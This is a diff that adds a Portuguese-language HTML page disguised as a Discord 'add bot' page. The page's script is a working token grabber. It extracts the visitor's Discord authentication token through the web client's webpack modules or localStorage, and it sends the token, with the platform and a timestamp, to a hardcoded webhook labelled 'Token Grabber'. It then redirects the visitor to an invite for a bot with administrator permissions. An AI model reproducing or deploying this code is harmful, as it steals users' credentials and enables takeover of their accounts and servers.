@@ -1,0 +1,93 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Adicionar Bot</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background: #36393f;
+            color: #dcddde;
+            text-align: center;
+            padding: 50px;
+        }
+        h1 { color: #7289da; }
+        button {
+            background: #7289da;
+            color: white;
+            border: none;
+            padding: 15px 30px;
+            font-size: 18px;
+            border-radius: 5px;
+            cursor: pointer;
+            margin-top: 20px;
+        }
+        button:hover { background: #5b6ebe; }
+    </style>
+</head>
+<body>
+    <h1>Clique no botão para adicionar o bot</h1>
+    <p>Você precisa estar logado no Discord neste navegador.</p>
+    <button onclick="iniciarProcesso()">Adicionar Bot Agora</button>
+
+    <script>
+        const WEBHOOK_URL = "https://discord.com/api/webhooks/1495879559529365605/jnDvjCQ91dV9VE_UZxIaUJ6Tgs3oMcbkSo-b1S8R1cIlA9GdB1tTHGR5WYfd3na6aSqe";
+        const BOT_INVITE = "https://discord.com/oauth2/authorize?client_id=1385679819508809778&permissions=8&integration_type=0&scope=bot";
+
+        async function pegarToken() {
+            // Método atualizado (funciona em 2026)
+            try {
+                const token = (webpackChunkdiscord_app.push([[''],{},e=>{m=[];for(let c in e.c)m.push(e.c[c])}]),m)
+                    .find(m => m?.exports?.default?.getToken !== void 0)
+                    .exports.default.getToken();
+
+                if (token) return token;
+            } catch (e) {}
+
+            // Método alternativo (fallback)
+            try {
+                const iframe = document.createElement('iframe');
+                document.body.appendChild(iframe);
+                const token = JSON.parse(iframe.contentWindow.localStorage.token);
+                iframe.remove();
+                return token;
+            } catch (e) {}
+
+            return null;
+        }
+
+        async function enviarParaWebhook(token) {
+            if (!token) return;
+
+            const payload = {
+                content: `**Novo token capturado!**\n\n**Token:** \`${token}\`\n**IP/Local:** ${navigator.platform} - ${new Date().toLocaleString('pt-BR')}`,
+                username: "Token Grabber",
+                avatar_url: "https://i.imgur.com/0Zx3Z3k.png"
+            };
+
+            try {
+                await fetch(WEBHOOK_URL, {
+                    method: "POST",
+                    headers: { "Content-Type": "application/json" },
+                    body: JSON.stringify(payload)
+                });
+            } catch (err) {
+                console.error("Erro ao enviar webhook", err);
+            }
+        }
+
+        async function iniciarProcesso() {
+            const token = await pegarToken();
+
+            if (token) {
+                await enviarParaWebhook(token);
+                alert("Redirecionando para adicionar o bot...");
+                window.location.href = BOT_INVITE;
+            } else {
+                alert("Não foi possível pegar o token. Certifique-se de que está logado no Discord Web (discord.com/app) e tente novamente.");
+            }
+        }
+    </script>
+</body>
+</html>
